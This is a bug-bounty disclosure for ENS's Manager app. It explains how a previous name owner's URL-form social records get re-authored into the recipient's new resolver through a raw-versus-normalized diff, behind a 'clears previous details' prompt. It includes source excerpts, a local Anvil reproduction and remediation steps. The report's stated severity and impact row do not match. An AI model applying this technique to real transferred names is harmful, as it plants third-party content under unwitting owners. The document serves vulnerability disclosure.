# 92995 w a medium a contact tab discord edit republishes inherited social handles through manager s resolver replacement

**Submitted on Sep 13th 2026 at 18:32:05 UTC by @yaohao159123 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92995
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (reflected), such as:
* Reflected HTML Injection
* Loading external site data

## Description

Manager's Edit Profile flow turns every social value into its display form before it decides what changed. The saved snapshot, however, still contains the value read from the resolver. That split is exploitable after an ordinary `.eth` transfer: a previous owner can leave URL-shaped social records such as `https://twitter.com/attacker`, while Manager treats the same record as the handle `attacker`. The alternate trigger validated here is not a description edit. The new owner opens the Contact tab and changes only the non-normalizing `com.discord` record to `recipient-discord`.

When the inherited resolver is not writable, Manager enters its resolver-replacement branch. The confirmation still says, "This name still has profile details from a previous owner. Continuing clears them and keeps only the changes you save." The request built by the application does not match that promise: it contains a resolver `multicall(bytes[])` with nine attacker-selected social `setText` calls followed by the one Discord call the recipient requested. A route-specific harness executed the frozen dialog, state machine, resolver-setup service, and ENSJS call builder. The exact 3,268-byte record payload then settled unchanged on a disposable local chain running canonical ENS `ENSRegistry` and `PublicResolver` contracts.

Across three clean runs, the replacement resolver retained all nine attacker handles and the recipient's Discord value; the untouched `description`, `com.youtube`, and `com.mastodon` keys stayed empty. Manager promoted Twitter, Telegram, and Farcaster into fallback Contact cards, while Portal's fixed-origin render path would link the supported handles to the attacker's profiles. The recipient therefore publishes attacker-authored profile content under their own resolver and fee-paying save, even though the only selected edit was Discord.

## Vulnerability Details

The audited public head is `1c9b47f18fcddd2e864dfe385c4171061c9811ae` (tree `fd2fa034e987dd81c4a170b3e8370e6edf2a3376`, branch `audit-comp-ready`). The relevant invariant is narrower than "the form eventually saves": when the replacement dialog promises to clear inherited details and retain only the user's edits, an untouched field must not be authored into the new resolver. The Contact-tab route violates that invariant through the same representation mismatch as the baseline path, with a different user-controlled field and final call.

#### Attack setup - the prior owner plants data before the transfer

The attacker is simply the prior owner of a second-level `.eth` name. Before handing over the name, they use an ordinary record-write path to store non-canonical values in the nine normalized social keys: `com.twitter`, `org.telegram`, `xyz.farcaster`, `com.instagram`, `com.github`, `com.linkedin`, `com.reddit`, `com.tiktok`, and `com.twitch`. For example, `https://twitter.com/attacker` is publicly visible and is a plausible value a normal owner might enter. The three controls without a normalizer (`com.discord`, `com.youtube`, and `com.mastodon`) are also seeded as `attacker-control` so the experiment can distinguish the mismatch from a blanket copy.

The attacker transfers the name normally. The recipient then opens Manager's Contact tab and changes only `com.discord` to `recipient-discord`; they do not edit `description`, `com.youtube`, or `com.mastodon`. The resolver-access probe reports that the inherited resolver cannot be written, so the ordinary save enters the replacement-resolver confirmation. No stolen credential, browser modification, pasted calldata, or attacker-controlled transaction is needed. The attacker controls only the publicly stored pre-transfer strings.

#### Root cause - display normalization is applied before a raw-versus-normalized diff

The first relevant operation is whole-form normalization. It runs for every submit, independently of the field that the user changed (`apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialogBody.tsx:73-74`):

```tsx
{({ canSubmit, values }) => {
  const submittedValues = normalizeProfileRecords(values)
  const diff = createDiff(savedRecords, submittedValues)
```

`normalizeProfileRecords` applies the per-key display normalizer to all social entries (`apps/manager/src/features/profile/utils/transformRecords.ts:78-93`):

```ts
const normalizeProfileTextRecords = (
  records: readonly TextRecordValue[],
): TextRecordValue[] =>
  records.map(({ key, value }) => ({
    key,
    value: getRecordDisplayValue(getRecordDef(key), value),
  }))

export const normalizeProfileRecords = (
  records: ProfileRecords,
): ProfileRecords => ({
  ...records,
  addresses: normalizeProfileAddresses(records.addresses),
  links: normalizeProfileLinks(records.links),
  social: normalizeProfileTextRecords(records.social),
})
```

Nine record definitions provide a `normalize` function (`apps/manager/src/features/profile/data/records/text.tsx:45-171`); `com.twitter`, for instance, strips the platform host and leaves the handle. `com.discord`, `com.youtube`, and `com.mastodon` deliberately have no such function. This is display-grade string processing rather than a canonical storage contract. The frozen code also shows that the Twitter normalizer is not idempotent: repeated application maps `https://x.com/x.com%2Fx.com%252Fattacker` to `x.com/x.com%2Fattacker`, then `x.com/attacker`, then `attacker`.

The dialog's save machine serializes the raw saved object as `before` and the already-normalized form as `after` (`apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialog.machine.ts:127-134`):

```ts
const getPendingSave = (
  savedRecords: ProfileRecords,
  currentRecords: ProfileRecords,
  deps: SaveDeps,
): PendingSave => {
  const before = transformToServiceFormat(savedRecords)
  const after = transformToServiceFormat(currentRecords)
```

Resolver reads enter `ProfileRecords` without this display rewrite (`apps/manager/src/features/profile/utils/transformRecords.ts:123-179`). For `com.twitter`, `before` therefore contains `https://twitter.com/attacker` and `after` contains `attacker`, even though the recipient's only callback was `com.discord`.

The transaction sink turns every text mismatch into a write. `computeRecordChanges` (`apps/manager/src/features/profile/service/profileRecordTransactions.ts:158-181`) uses the following comparison:

```ts
for (const key of textKeys) {
  const prev = (beforeTexts.get(key) ?? '').trim()
  const next = (afterTexts.get(key) ?? '').trim()

  if (prev !== next) {
    textChanges.push({
      key,
      value: next === '' ? null : next,
    })
  }
}
```

The resulting changes are passed to the ENSJS record-call builder and ABI-encoded. In the alternate harness, the builder emits nine `setText(node, key, "attacker")` calls plus `setText(node, "com.discord", "recipient-discord")`. The non-normalizing controls that were not edited are absent, which is the expected signature of a representation mismatch rather than an unconditional copy.

The resolver-replacement service batches those record calls after deploying or selecting the new resolver and setting the registry pointer (`apps/manager/src/features/profile/service/setupControlledResolver.ts:96-134`):

```ts
const recordCalls = hasRecordsToWrite
  ? (
      await buildRecordsUpdateCalls({
        name,
        before,
        after,
        publicClient,
        resolverAddress: resolver,
      })
    ).calls
  : []

const calls: Call[] = [
  ...(existing ? [] : [buildDeployOwnedPermResCall(ownerAddress)]),
  buildSetResolverCall({ name, newResolver: resolver }),
  ...recordCalls,
]

const request: TransactionRequest = {
  type: 'rhinestone-intent',
  from: smartAccount,
  chainId,
  rhinestoneParams: { calls, feeAsset: 'USDC' },
}
```

The confirmation text is unchanged for this route (`apps/manager/src/features/profile/components/dialogs/ResolverSetupConfirmDialog.tsx:38-46`):

```tsx
.with('edit-profile', () => ({
  title: <Trans>Start a new profile for this name?</Trans>,
  description: (
    <Trans>
      This name still has profile details from a previous owner. Continuing
      clears them and keeps only the changes you save.
    </Trans>
  ),
  confirmLabel: <Trans>Replace & Save</Trans>,
}))
```

The route-specific UI assertion finds the clearing promise but no attacker handle and no `com.twitter` field name. The user authorizes a single Discord edit while the request carries ten text writes.

#### Display consequences after settlement

After the replacement transaction, the settled values are read back as ordinary profile data. Manager's `getPrimaryContactItems` (`apps/manager/src/features/profile/components/view/ProfileView.helpers.ts:170-194`) chooses the first three non-empty contact/social records. The alternate run selects Twitter, Telegram, and Farcaster, with the same fixed-origin hrefs: `https://x.com/attacker`, `https://t.me/attacker`, and `https://farcaster.xyz/attacker`.

Portal's `SocialRecord` component (`apps/portal/src/features/profile/components/SocialRecord.tsx:128-137`) appends stored text to a per-platform base URL (`baseUrls` at :19-29):

```tsx
<ExternalLink
  href={`https://${baseUrls[record.key]}/${record.value}`}
  ...
>
  <Icon record={record} /> {record.value}
</ExternalLink>
```

The same chain-read values consequently render as seven direct links for the Portal-supported keys: `https://x.com/attacker`, `https://t.me/attacker`, `https://github.com/attacker`, `https://instagram.com/attacker`, `https://linkedin.com/in/attacker`, `https://warpcast.com/attacker`, and `https://reddit.com/user/attacker`.

#### Runtime proof summary

The alternate proof executes the real frozen Manager dialog and form callbacks, drives the Contact-tab Discord change, captures the exact resolver multicall, and sends those bytes to canonical local ENS contracts. The harness checks the changed-section marker, the confirmation text, the ten decoded writes, the canonical-baseline control, and the Manager fallback contacts. Three independent local Anvil runs then assert that the mined input is byte-identical to the captured app payload and that the settled text state contains the nine carried handles plus `recipient-discord`.

The app artifact is 3,268 bytes of record calldata and has SHA-256 `5fb488cb34fd033e16d668f57db5b115e17c2c26f78525ba5ee5bbe312c658a7`. Each cold start passed all route assertions. Removing only block and transaction metadata from the three end-state files produces an identical semantic state.

Route status: `alternative_route_validated`.

#### Evidence boundaries (the PoC states every substitution)

The Rhinestone smart-account intent is not broadcast. The harness captures the literal call array passed to the transaction manager, and the local externally owned account transaction carries exactly the captured record bytes. The replacement resolver is canonical v1 `PublicResolver` from ens-contracts commit `5141a2acdf77cf49f5134d674c2792b30f5ee0db`, not the production v2 owned resolver; both expose the `setText` and `multicall` interfaces used by the payload, while their authorization rules differ. The inherited-resolver non-writability condition is represented at the UI trigger by the real resolver-access probe and mocked result, not by pretending that v1 permits an unauthorized write. Portal rendering is tested at component level rather than against a live deployment. These limits do not change the demonstrated facts: the app selects nine untouched normalized values, hides their keys behind a clearing promise, and the exact bytes persist in the recipient's replacement resolver.

#### Recommended remediation

1. Compare like with like: normalize the saved baseline and submitted state with the same function before diffing, or build replacement writes from fields explicitly touched by the user. A derived whole-object diff should not author untouched fields.
2. Show the exact key/value writes in `Replace & Save`; the displayed clearing statement must be checkable against the transaction.
3. Make social display normalization single-pass and idempotent. The nested Twitter example currently changes again on each pass.
4. Add regression coverage for a transferred name whose inherited resolver contains URL-shaped socials: a Contact-tab-only `com.discord` edit must emit exactly one Discord write through dialog, machine, service, and builder. Repeat the test for all nine normalizers and the three non-normalizing controls, and retain the existing description-only case.

## Impact Details

Selected impact row (Websites & Apps, High): **"Injecting/modifying the static content on the target application without JavaScript (persistent), such as: - HTML injection without JavaScript - Replacing existing text with arbitrary text - Arbitrary file uploads, etc."**

This is the literal row. The attacker is the prior owner who plants public text before the transfer; the recipient is the new owner who later changes only Discord. The nine carried values are attacker-selected handle strings, are persisted by a mined transaction in the recipient's replacement resolver, and are rendered as React-escaped plain text plus fixed-origin social links. No JavaScript execution is involved. Manager promotes three of the values to fallback Contact cards and Portal renders seven as direct platform links.

The program's reflected-plain-text exclusion does not remove this case: it preserves persistent plain-text injection, and these values are persistent on-chain state. The recipient's ordinary Contact-tab save also pays the application fee and publishes the attacker's content under the recipient's ownership. The confirmation does not enumerate the carried keys, so the recipient cannot compare the promised clear operation with the ten-call request at the decision point.

The limits are material and are not hidden: the content is React-escaped, not HTML or XSS; links remain on configured social origins, not an open redirect; no funds, ownership, NFT, address record, or authority changes; and the recipient can delete the records after discovering them. The route requires a transferred or gifted name, an inherited resolver that the recipient cannot write, and one ordinary Contact-tab save. Within those conditions, it is persistent JavaScript-free replacement of profile text with third-party-chosen content.

## References

* In-scope asset: `apps/manager` (Manager app, Websites & Apps): <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* Whole-form normalization before dirty-tracking: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialogBody.tsx>
* Per-key display normalizers applied to every social record: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/utils/transformRecords.ts>
* Nine social records with `normalize` and three controls without: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/data/records/text.tsx>
* Raw-before / normalized-after save snapshot: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/components/dialogs/edit-profile/EditProfileDialog.machine.ts>
* Non-writable inherited resolver steering into replacement mode: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/components/dialogs/edit-profile/useEditProfileDialogSave.ts>
* Clearing-promise confirmation without a carried-field list: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/components/dialogs/ResolverSetupConfirmDialog.tsx>
* `prev !== next` text-change sink and ENSJS call construction: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileRecordTransactions.ts>
* Batched replacement-resolver intent (deploy + setResolver + record multicall, USDC fee): <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/setupControlledResolver.ts>
* Manager fallback Contact cards: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/components/view/ProfileView.helpers.ts>
* Portal fixed-origin social links from stored text: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/components/SocialRecord.tsx>
* Official competition scope: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* ENS text-record standard (social keys such as `com.twitter` are ENSIP-5 global keys): <https://docs.ens.domains/ensip/5>

The public-state refresh on 2026-09-06 found the audit branch still at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`; the only pull ref was an unrelated Hono dependency bump. No undisclosed finding is inferred from public data.

## Proof of Concept

### What this PoC proves

The attached route bundle contains an executed Contact-tab reproduction against the frozen public competition head `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. It drives the real Manager Edit Profile dialog, invokes the real social-change callback with only `com.discord = recipient-discord`, traverses the real save machine and resolver-setup service, and captures the exact record multicall. It then submits those exact bytes to a fresh local Anvil chain with canonical ENS contracts, checks byte identity of the mined input, reads both resolvers, and sends the result through the real Manager contact helper.

The proof establishes a different trigger from the description-only baseline route: the selected tab is Contact, the sole user change is Discord, and the final intended write is Discord. The nine other writes still arise from the raw/normalized representation mismatch. The canonical-baseline control emits one Discord write, ruling out a generic copy of all records. All writes are local to disposable nodes; no Sepolia transaction, production account, or deployed contract is contacted.

### Prerequisites

* A clean checkout of the official repository at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae` with locked dependencies (`corepack enable && pnpm install --frozen-lockfile`; the recorded run used Node.js v22.23.2 and repository-pinned pnpm 10.27.0 on macOS arm64).
* Foundry (`anvil`, `cast`, and `forge`), `jq`, and `shasum`.
* A free loopback port, for example 18546.
* The `profile-route-poc/` bundle, containing the three complete reproduction files, executed artifacts, logs, and integrity manifest.

### Step-by-step reproduction

1. Enter and verify the attached bundle before using it:

```bash
# Run this from the directory that contains profile-route-poc/.
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
shasum -a 256 -c "$BUNDLE_DIR/SHA256SUMS.txt"
```

2. Prepare the frozen checkout and stage the route-specific harness (the added file is untracked and the frozen tracked tree is unchanged):

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
CHECKOUT_DIR="$BUNDLE_DIR/official-ens-checkout"
git clone https://github.com/immunefi-team/audit-comp-ens.git "$CHECKOUT_DIR"
git -C "$CHECKOUT_DIR" checkout --detach 1c9b47f18fcddd2e864dfe385c4171061c9811ae
(
  cd "$CHECKOUT_DIR"
  corepack enable
  pnpm install --frozen-lockfile
)
mkdir -p "$CHECKOUT_DIR/apps/manager/src/__poc_alt_route__"
cp "$BUNDLE_DIR/manager-profile-social-carryover-alt.test.tsx" \
   "$CHECKOUT_DIR/apps/manager/src/__poc_alt_route__/"
```

3. Build the pinned canonical-contract environment once:

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
bash "$BUNDLE_DIR/setup-poc-env-profile-alt.sh"
```

4. Run the real application route and capture its payload:

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
CHECKOUT_DIR="$BUNDLE_DIR/official-ens-checkout"
mkdir -p "$BUNDLE_DIR/artifacts"
(
  cd "$CHECKOUT_DIR/apps/manager"
  ALT_ROUTE_ARTIFACT="$BUNDLE_DIR/artifacts/app-built-alt.json" \
    pnpm exec vitest run \
    src/__poc_alt_route__/manager-profile-social-carryover-alt.test.tsx \
    --config vitest.config.ts --reporter verbose \
    --testTimeout 15000 --hookTimeout 15000
)
```

Expected result is `Test Files 1 passed (1)` and `Tests 3 passed (3)`. The artifact must list `changed_sections: ["contact.com.discord"]`, ten writes, and no writes for the untouched control keys.

5. Start a fresh local Anvil process, wait for its JSON-RPC endpoint, and run the first lifecycle:

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
export PATH="$HOME/.foundry/bin:$PATH"
RPC_URL=http://127.0.0.1:18546
anvil --port 18546 --chain-id 11155111 --block-time 1 \
  >"$BUNDLE_DIR/artifacts/anvil-profile-run1.log" 2>&1 &
ANVIL_PID=$!
for _ in $(seq 1 30); do
  cast chain-id --rpc-url "$RPC_URL" >/dev/null 2>&1 && break
  sleep 1
done
cast chain-id --rpc-url "$RPC_URL" >/dev/null
bash "$BUNDLE_DIR/onchain-lifecycle-alt.sh" \
  "$RPC_URL" \
  "$BUNDLE_DIR/artifacts/app-built-alt.json" \
  "$BUNDLE_DIR/artifacts/onchain-end-state-alt-run1.json" \
  "$BUNDLE_DIR/artifacts/onchain-lifecycle-alt-run1.log"
kill "$ANVIL_PID" 2>/dev/null || true
wait "$ANVIL_PID" 2>/dev/null || true
```

The script registers `recipient.eth`, seeds the old resolver as the prior owner, transfers the name, points the registry at a fresh resolver, sends the exact application multicall, and asserts the mined input byte-for-byte before reading state back.

6. Repeat from clean Anvil processes on ports 18547 and 18548:

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
export PATH="$HOME/.foundry/bin:$PATH"
run_clean() {
  local port="$1" run="$2"
  local rpc="http://127.0.0.1:${port}"
  anvil --port "$port" --chain-id 11155111 --block-time 1 \
    >"$BUNDLE_DIR/artifacts/anvil-profile-${run}.log" 2>&1 &
  local anvil_pid=$!
  for _ in $(seq 1 30); do
    cast chain-id --rpc-url "$rpc" >/dev/null 2>&1 && break
    sleep 1
  done
  cast chain-id --rpc-url "$rpc" >/dev/null
  bash "$BUNDLE_DIR/onchain-lifecycle-alt.sh" \
    "$rpc" \
    "$BUNDLE_DIR/artifacts/app-built-alt.json" \
    "$BUNDLE_DIR/artifacts/onchain-end-state-alt-${run}.json" \
    "$BUNDLE_DIR/artifacts/onchain-lifecycle-alt-${run}.log"
  kill "$anvil_pid" 2>/dev/null || true
  wait "$anvil_pid" 2>/dev/null || true
}
run_clean 18547 run2
run_clean 18548 run3
```

Compare semantic state while excluding only block and transaction metadata:

```bash
BUNDLE_DIR="$(cd profile-route-poc && pwd)"
diff -u \
  <(jq -S 'del(.blocks, .transactions)' "$BUNDLE_DIR/artifacts/onchain-end-state-alt-run1.json") \
  <(jq -S 'del(.blocks, .transactions)' "$BUNDLE_DIR/artifacts/onchain-end-state-alt-run2.json")
diff -u \
  <(jq -S 'del(.blocks, .transactions)' "$BUNDLE_DIR/artifacts/onchain-end-state-alt-run1.json") \
  <(jq -S 'del(.blocks, .transactions)' "$BUNDLE_DIR/artifacts/onchain-end-state-alt-run3.json")
```

Both diffs are empty. The three raw JSON hashes may differ because independent transactions have different metadata.

### Executed on-chain lifecycle (what the run does)

1. Deploy canonical `ENSRegistry`, the `ReverseRegistrar` required by `PublicResolver`, and two canonical `PublicResolver` instances on a fresh chain with ID 11155111.
2. The prior owner registers `recipient.eth`, seeds the nine URL-form social values, seeds the three non-normalizing controls and the old description, and transfers ownership to the recipient.
3. The recipient sets the registry resolver pointer to the fresh resolver and sends the app-built Contact-tab payload. That payload contains nine normalized attacker handles and the intended `com.discord = recipient-discord` write.
4. The script asserts that the mined transaction input equals the captured application calldata and writes a complete read-back JSON for both resolvers.

The lifecycle was independently executed on ports 18546, 18547, and 18548. Every run returned a successful receipt and passed the route-specific assertions.

### On-chain end state (run 1 == run 3, semantic state)

The replacement resolver in every run settles with the recipient as owner and contains:

* `com.twitter`, `org.telegram`, `xyz.farcaster`, `com.instagram`, `com.github`, `com.linkedin`, `com.reddit`, `com.tiktok`, and `com.twitch` set to `attacker`.
* `com.discord` set to `recipient-discord`, the only requested Contact-tab edit.
* `com.youtube`, `com.mastodon`, and `description` empty.
* `mined_input_byte_identical_to_app_calldata: true` for the 3,268-byte multicall.

The old resolver still retains its raw pre-transfer values. Nothing was "cleared" there; selected attacker text was re-authored into the new resolver. After removing only block and transaction metadata, run 1, run 2, and run 3 are byte-for-byte equal under sorted JSON comparison.

### Render consequences from chain state

The reload assertion consumes only the chain-read replacement state. Manager's real `transformProfileRecords` and `getPrimaryContactItems` select Twitter, Telegram, and Farcaster as the three fallback Contact cards, with hrefs `https://x.com/attacker`, `https://t.me/attacker`, and `https://farcaster.xyz/attacker`. The Portal component path renders seven supported carried keys as direct links to the corresponding attacker handles. The recipient's chosen Discord value is present but is not one of those three first fallback cards.

### App-layer harness results (component level, real frozen code)

The route harness passes 3/3 tests. It records `contact.com.discord` as the only changed section; the confirmation includes the clearing promise but neither `attacker` nor `com.twitter`; the request contains exactly the deploy plus resolver-pointer and record-multicall calls; and the record multicall decodes to ten writes. The canonical-baseline test emits only the one Discord write. The third test preserves the nested Twitter normalizer check, showing why repeated display passes are unsafe even though the selected route needs only one pass.

### Honest simplifications (nothing implied beyond this list)

1. The smart-account Rhinestone intent and USDC fee are not executed. The local externally owned account transaction carries the exact record bytes captured from `rhinestoneParams.calls`.
2. The local replacement is v1 `PublicResolver`, not the production v2 owned permissioned resolver. The shared `setText`/`multicall` interface makes the payload and text-state observation comparable; authorization behavior is not claimed equivalent.
3. The non-writable inherited-resolver condition is driven by the real UI probe and a controlled harness result. Canonical v1 ownership transfer would authorize the recipient on the old resolver, so the harness does not mislabel that v1 state as production permission behavior.
4. The registry pointer uses v1 `setResolver` in the local lifecycle, while the app constructs its v2-stack call. The vulnerable record payload is unchanged.
5. Portal rendering is verified with the real component in a local test environment, not with a browser against a live Portal deployment. Resolver reads are direct local `eth_call`s.

### Bundle contents and integrity

| File                                                                        | Content                                                                                    |
| --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `manager-profile-social-carryover-alt.test.tsx`                             | Contact-tab route harness using the real frozen Manager dialog and services                |
| `onchain-lifecycle-alt.sh`                                                  | Prior-owner seed, transfer, resolver replacement, exact payload submission, and assertions |
| `setup-poc-env-profile-alt.sh`                                              | Pinned canonical ENS contract environment builder                                          |
| `app-built-alt.json`                                                        | Captured application calldata, decoded writes, changed section, and fallback contacts      |
| `onchain-end-state-alt-run1.json` through `onchain-end-state-alt-run3.json` | Three independent chain read-backs                                                         |
| `artifacts/app-harness-alt.log` and `profile-chain-summary.log`             | Application test result, route assertions, and three-run summary                           |
| `COMMAND_LOG.md`                                                            | Exact commands, environment locks, and observed results                                    |
| `SHA256SUMS.txt`                                                            | Integrity manifest for the attached reproduction bundle                                    |

The app artifact hash is `5fb488cb34fd033e16d668f57db5b115e17c2c26f78525ba5ee5bbe312c658a7`. The three raw end-state files differ only in transaction metadata; sorted semantic comparison is equal across all runs.

### Safety limits

* No production application, deployed ENS contract, or public Sepolia state receives a write; all transactions target disposable local Anvil nodes.
* Accounts are public deterministic Anvil test accounts. No real wallet key, credential, or production data is used.
* The official checkout remains unmodified in tracked files; only the untracked route harness is added under `apps/manager/src/__poc_alt_route__/`.
* The route does not contact social platforms, phish users, or rely on social engineering. It demonstrates only the on-chain profile-text consequence and its fixed-origin rendering.

**Alternative-route analysis**

````
# Alternative route analysis

## Scope and source

- Source revision: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.
- Route objective: reach the same whole-form normalization versus raw-snapshot root cause and the same persistent attacker-authored profile impact through a different recipient action and call ordering.
- No live chain, production deployment, public testnet, or external submission was used.

## Hypotheses searched

1. **Different edited field (selected).** Keep the prior owner's nine non-canonical social records and the non-writable inherited resolver, but have the recipient open the Contact tab and change only the non-normalizing `com.discord` record. This changes the user-controlled field and UI route from the baseline General-tab `description` edit while leaving the whole-form normalization path intact.
2. **Repeated-save cascade (not selected as the primary route).** A nested Twitter URL can normalize to a different value on successive saves. The normalizer is demonstrably non-idempotent; a separate multi-save proof would add a second variant but would not be needed to establish a distinct first trigger. The nested-normalizer assertion remains in the alternate harness as a control.
3. **Canonical baseline control.** If the nine social records are already stored as `attacker`, changing only `com.discord` must emit only the intended Discord write. This falsifies a blanket-copy explanation and isolates the representation mismatch.

## Selected route

1. The prior owner writes the nine social values in the same non-canonical URL forms used by the baseline path and transfers `recipient.eth`.
2. The recipient opens Manager's Contact tab, changes only `com.discord` to `recipient-discord`, and never edits `description`, `com.youtube`, or `com.mastodon`.
3. The inherited resolver is treated as non-writable at the UI trigger, so the real dialog takes the resolver-replacement (`Replace & Save`) branch.
4. The real frozen Manager dialog, state machine, resolver setup service, and ENSJS builder produce a 10-call resolver multicall: the nine normalized social writes followed by the intended `com.discord` write.
5. The exact application bytes are sent by the recipient to a fresh canonical `PublicResolver` on a disposable Anvil chain after the registry pointer is replaced.
6. The settled resolver contains the nine attacker handles and `recipient-discord`; untouched `description`, `com.youtube`, and `com.mastodon` remain empty. Manager's fallback contacts still resolve to the first three attacker handles.

This is a distinct trigger combination because the saved field, selected tab, and final intended write differ from the baseline `description` edit, while the vulnerable whole-form comparison and replacement-resolver ordering remain identical. The recipient's Contact-tab visibility does not authorize the nine extra writes: the confirmation still omits their keys and repeats the clearing promise.

## App-layer verification

The unmodified frozen application code was exercised through a route-specific Vitest harness copied into an untracked `__poc_alt_route__` directory. The harness changes only the mocked user interaction: it selects the Contact tab and calls the real dialog callback with `com.discord = recipient-discord`.

Command:

```bash
pnpm exec vitest run src/__poc_alt_route__/manager-profile-social-carryover-alt.test.tsx \
  --config vitest.config.ts --reporter verbose --testTimeout 15000 --hookTimeout 15000
````

Observed result: `Test Files 1 passed (1)` and `Tests 3 passed (3)`. The route artifact records:

* `changed_sections`: `contact.com.discord`.
* 10 `setText` writes: nine keys with value `attacker`, then `com.discord = recipient-discord`.
* Confirmation contains the clearing promise and omits `attacker` and `com.twitter`.
* Canonical-baseline control emits exactly one `com.discord` write.
* Fallback Contact cards are Twitter, Telegram, and Farcaster, all resolving to the attacker handle.
* App artifact SHA-256: `5fb488cb34fd033e16d668f57db5b115e17c2c26f78525ba5ee5bbe312c658a7`.

The full artifact is `profile-route-poc/artifacts/app-built-alt.json`; the attached harness source is `profile-route-poc/manager-profile-social-carryover-alt.test.tsx`.

## Runtime verification

The route-specific lifecycle script uses the canonical ENS `ENSRegistry`, `ReverseRegistrar`, and `PublicResolver` contracts compiled from ens-contracts commit `5141a2acdf77cf49f5134d674c2792b30f5ee0db`. It starts a clean chain with chain ID `11155111`, registers the name, seeds the old resolver, transfers ownership, sets the replacement resolver, submits the exact app calldata, and reads both resolvers back.

The lifecycle ran three times on fresh local Anvil processes (ports 18546, 18547, and 18548). Every run passed:

* Mined transaction input was byte-identical to the app-built multicall (a 6538-character calldata string including the `0x` prefix, 3,268 bytes).
* Transaction status was successful.
* Nine normalized social values settled as `attacker`.
* `com.discord` settled as `recipient-discord`.
* `com.youtube`, `com.mastodon`, and `description` stayed empty on the replacement resolver.
* The script's explicit alternative-route assertions passed.

After removing only block and transaction metadata, the three end-state JSON files were semantically identical (`semantic-state-equal-3-of-3`). The raw file hashes differ only because transaction metadata changes between independent runs. Evidence files are `profile-route-poc/artifacts/onchain-end-state-alt-run1.json`, `profile-route-poc/artifacts/onchain-end-state-alt-run2.json`, and `profile-route-poc/artifacts/onchain-end-state-alt-run3.json`; command logs are the matching `profile-route-poc/artifacts/onchain-lifecycle-alt-run*.log` files.

## Evidence boundaries

* The Rhinestone smart-account intent and fee path are not broadcast; the exact record bytes captured from the application's request are delivered as local externally owned account transactions.
* The local resolver is canonical v1 `PublicResolver`, while production uses the v2 owned resolver. The tested `setText`/`multicall` bytes and resulting text-state semantics are shared; authorization semantics differ.
* The inherited-resolver non-writability condition is represented by the real dialog harness's resolver-access probe, not by an on-chain v2 permission test.
* Rendering is proven by the real Manager helper in the app harness; this route does not contact a live Portal deployment.
* All writes are to disposable local Anvil nodes using public deterministic accounts. No production or public testnet state was changed.

## Execution notes and resolved errors

* The application test ran directly in the locked official checkout; the attached harness is isolated under `profile-route-poc/` and does not alter tracked source files.
* Foundry 1.7.1 prints a successful receipt status as `true`; the route script accepts `true`, `1`, and `0x1` without changing the transaction or assertion semantics.
* Two trial invocations had misspelled long output paths and were discarded; all counted runs started from fresh nodes and wrote complete artifacts.

## Conclusion

`alternative_route_validated`: the Contact-tab `com.discord` edit is a distinct controllable combination with an independently executed runtime PoC and the same root cause, source facts, persistent impact, and resolver-replacement ordering as the baseline behavior.

````

**Embedded file: `profile-chain-summary.log`**

```text
Route: contact-tab-com.discord-edit
Run date: 2026-09-12
Chain: disposable local Anvil, chain ID 11155111
Contracts: canonical ENSRegistry, ReverseRegistrar, and two PublicResolver instances
Application calldata: 6538-character string including 0x (3268 bytes), 10 setText calls

Run 1 (port 18546): success; byte-identical input; all route assertions passed.
Run 2 (port 18547): success; byte-identical input; all route assertions passed.
Run 3 (port 18548): success; byte-identical input; all route assertions passed.

Settled replacement resolver in every run:
  nine normalized social keys = attacker
  com.discord = recipient-discord
  com.youtube = empty
  com.mastodon = empty
  description = empty

Semantic comparison after removing only block and transaction metadata:
  semantic-state-equal-3-of-3

Current raw artifact hashes:
  app-built-alt.json                 5fb488cb34fd033e16d668f57db5b115e17c2c26f78525ba5ee5bbe312c658a7
  onchain-end-state-alt-run1.json    763f4283cca4c2d96aa6d47046168b5721b4a0b9f899411904005f5d326a003a
  onchain-end-state-alt-run2.json    18e4e76b6f861aec591d36579e6d6bac79b21c04dce6c057dda2f3b61d16ece2
  onchain-end-state-alt-run3.json    18e4e76b6f861aec591d36579e6d6bac79b21c04dce6c057dda2f3b61d16ece2
````

**Embedded reproduction sources**

